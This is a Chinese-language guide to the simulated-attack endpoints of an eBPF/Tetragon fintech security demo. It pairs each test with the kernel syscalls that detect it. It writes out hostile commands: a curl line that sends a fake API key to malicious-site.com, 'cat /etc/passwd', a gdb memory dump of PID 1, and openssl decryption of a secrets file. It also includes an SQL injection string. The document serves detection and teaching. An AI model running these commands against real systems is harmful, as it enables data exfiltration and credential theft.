# 安全測試模擬指南

本文檔詳細說明了 `fintech-ebpf-demo` 專案中內置的各項安全測試模擬功能。這些功能旨在模擬常見的攻擊行為，以驗證和展示 Cilium/Tetragon eBPF 的內核級監控、檢測與攔截能力。

## 核心概念

所有安全測試都遵循一個標準的流程：

1.  **使用者觸發**: 在前端 UI（如安全頁面）點擊一個測試按鈕。
2.  **前端請求**: 瀏覽器向後端 `trading-api` 服務發送一個特定的 API 請求（通常是 POST）。
3.  **後端執行**: `trading-api` 服務接收到請求後，其對應的處理函數 (Handler) 會在自身的 Pod 容器內部執行一個預設的、用於模擬攻擊的 Shell 命令。
4.  **eBPF 捕獲**: 部署在 Kubernetes 節點上的 Tetragon Agent，其 eBPF 探針會實時監控內核中的系統調用 (Syscall)。當後端容器執行惡意命令時，相關的系統調用（如 `execve`, `openat`, `connect`, `write` 等）會被 eBPF 探針捕獲。
5.  **事件上報與展示**: Tetragon 將捕獲到的原始系統調用轉化為結構化的安全事件，並根據預設或自訂的策略（Tracing Policy）判斷其是否為惡意行為。這些事件隨後可以通過 API、日誌或 WebSocket 推送給前端，最終展示在「eBPF 安全事件中心」頁面。

---

## 安全測試詳解

以下是每個安全測試端點的具體行為和流程分析。

### 1. 命令注入 (Command Injection)

- **Endpoint**: `POST /api/v1/security/test/command`
- **模擬場景**: 模擬攻擊者利用應用程式漏洞，注入並執行任意作業系統命令。這是最直接和危險的攻擊之一。
- **後端行為**: `TestCommandInjection` 處理函數會執行以下命令：
  ```bash
  ps aux
  ```
  這個命令會列出當前容器內運行的所有進程。雖然 `ps` 本身不是惡意命令，但它模擬了攻擊者在獲得執行權限後，進行信息收集（如查看正在運行的服務和進程）的典型第一步。
- **eBPF 監控點**:
  - `execve`: Tetragon 會捕獲到 `trading-api` 進程創建了一個新的子進程 `ps`。這是最關鍵的監控點。
  - `openat`, `read`: `ps` 命令為了獲取進程信息，會讀取 `/proc` 文件系統下的多個文件。

### 2. 任意文件訪問 (File Access)

- **Endpoint**: `POST /api/v1/security/test/file`
- **模擬場景**: 模擬攻擊者讀取或寫入伺服器上的敏感文件，如配置文件、密碼文件或原始碼。
- **後端行為**: `TestFileAccess` 處理函數會執行以下命令：
  ```bash
  cat /etc/passwd
  ```
  這個命令嘗試讀取包含系統用戶列表的 `/etc/passwd` 文件。這是一個典型的攻擊行為，用於收集目標系統的用戶信息。
- **eBPF 監控點**:
  - `execve`: 捕獲 `cat` 命令的執行。
  - `openat`: 捕獲對 `/etc/passwd` 文件的「打開」操作。Tetragon 的策略可以專門針對對此類敏感文件的訪問進行告警。
  - `read`, `write`: 捕獲文件的讀取和寫入操作，並可以顯示寫入的內容。

### 3. 網絡掃描 (Network Scan)

- **Endpoint**: `POST /api/v1/security/test/network`
- **模擬場景**: 模擬攻擊者在攻入一個容器後，對內部網絡進行橫向掃描，以發現其他可攻擊的服務。
- **後端行為**: `TestNetworkScan` 處理函數會執行以下命令：
  ```bash
  curl -s -o /dev/null http://risk-engine:30081/health
  ```
  這個命令會向內部網絡的 `risk-engine` 服務發起一個 HTTP 請求。這模擬了攻擊者探測內部服務是否存活以及開放了哪些端口。
- **eBPF 監控點**:
  - `execve`: 捕獲 `curl` 命令的執行。
  - `connect`: 捕獲 `trading-api` 容器嘗試與 `risk-engine` 容器建立 TCP 連接的系統調用，包括目標 IP 和端口。
  - `send`, `recv`: 捕獲網絡數據的發送與接收。

### 4. 敏感數據洩露 (Sensitive Data Leak)

- **Endpoint**: `POST /api/v1/security/test/sensitive`
- **模擬場景**: 模擬攻擊者將竊取到的敏感數據（如用戶資料、API 金鑰）通過網絡外傳到其控制的服務器。
- **後端行為**: `TestSensitiveDataLeak` 處理函數會執行以下命令：
  ```bash
  echo "user_id: 123, api_key: sec-xxxxxxxx" | curl -X POST -d @- http://malicious-site.com/log
  ```
  該命令將一條包含模擬敏感數據的字符串通過管道傳遞給 `curl`，並 POST到一個虛構的惡意域名 `malicious-site.com`。
- **eBPF 監控點**:
  - `execve`: 捕獲 `echo` 和 `curl` 命令的執行。
  - `connect`: 捕獲到對外部惡意域名 `malicious-site.com` 的連接請求。Tetragon 策略可以配置域名黑名單，對此類連接直接告警。
  - `sendto` / `write`: 可以捕獲到正在通過網絡發送的具體數據內容，從而識別出數據洩露。

### 5. SQL 注入 (SQL Injection)

- **Endpoint**: `POST /api/v1/security/test/sql`
- **模擬場景**: 模擬攻擊者通過應用輸入點注入惡意的 SQL 查詢，以繞過認證、竊取或篡改數據庫內容。
- **後端行為**: `TestSQLInjection` 處理函數會執行以下操作：
  它會在日誌中記錄一條模擬的惡意 SQL 查詢，但 **不會** 真正執行它，以避免破壞數據庫。
  ```go
  logger.WithField("query", "SELECT * FROM users WHERE id = '1' OR '1'='1';").Warn("模擬SQL注入攻擊")
  ```
- **eBPF 監控點**:
  - 此測試主要在應用層面產生日誌，而非觸發典型的內核級異常。但如果真的執行了惡意查詢，Tetragon 可以通過監控數據庫進程（如 `postgres`, `mysql`）的網絡通信來發現異常的查詢模式。

### 6. 權限提升 (Privilege Escalation)

- **Endpoint**: `POST /api/v1/security/test/privilege`
- **模擬場景**: 模擬攻擊者利用系統漏洞（如 SUID/GUID 程序）將自己從普通用戶權限提升到 root 權限。
- **後端行為**: `TestPrivilegeEscalation` 處理函數會執行以下命令：
  ```bash
  sudo -l
  ```
  該命令嘗試列出當前用戶可以通過 `sudo` 執行的命令。這是攻擊者在尋找提權路徑時的常用手段。
- **eBPF 監控點**:
  - `execve`: 捕獲 `sudo` 命令的執行。`sudo` 的執行本身就是一個值得關注的高權限操作。
  - `setuid`/`setgid`: 如果提權成功，Tetragon 會捕獲到進程的有效用戶 ID (EUID) 發生變化的系統調用。

### 7. 加密弱點 (Crypto Weakness)

- **Endpoint**: `POST /api/v1/security/test/crypto`
- **模擬場景**: 模擬應用程序使用了過時或不安全的加密算法，或者攻擊者嘗試對加密文件進行操作。
- **後端行為**: `TestCryptoWeakness` 處理函數會執行以下命令：
  ```bash
  openssl enc -aes-128-cbc -d -in /config/secrets.enc -out /tmp/secrets.dec
  ```
  該命令使用 `openssl` 工具嘗試解密一個（虛構的）加密文件。
- **eBPF 監控點**:
  - `execve`: 捕獲 `openssl` 命令的執行。
  - `openat`: 捕獲對加密文件 `/config/secrets.enc` 的讀取和對輸出文件 `/tmp/secrets.dec` 的寫入。可以配置策略來監控對特定加密庫或工具的調用。

### 8. 內存轉儲 (Memory Dump)

- **Endpoint**: `POST /api/v1/security/test/memory`
- **模擬場景**: 模擬攻擊者使用調試工具（如 gdb）附加到一個正在運行的進程上，並轉儲其內存，以竊取內存中的敏感信息（如密碼、私鑰）。
- **後端行為**: `TestMemoryDump` 處理函數會執行以下命令：
  ```bash
  gdb -p 1 -batch -ex "dump memory /tmp/proc1.dump 0x400000 0x401000"
  ```
  該命令嘗試使用 `gdb` 調試器附加到 PID 為 1 的進程（通常是容器的初始進程），並將其一小段內存轉儲到 `/tmp/proc1.dump` 文件。
- **eBPF 監控點**:
  - `execve`: 捕獲 `gdb` 命令的執行。在生產環境中，任何調試工具的執行都極其可疑。
  - `ptrace`: `gdb` 的核心是 `ptrace` 系統調用，Tetragon 可以精確捕獲哪個進程正在嘗試 `ptrace` 另一個進程，這是攻擊的核心指標。 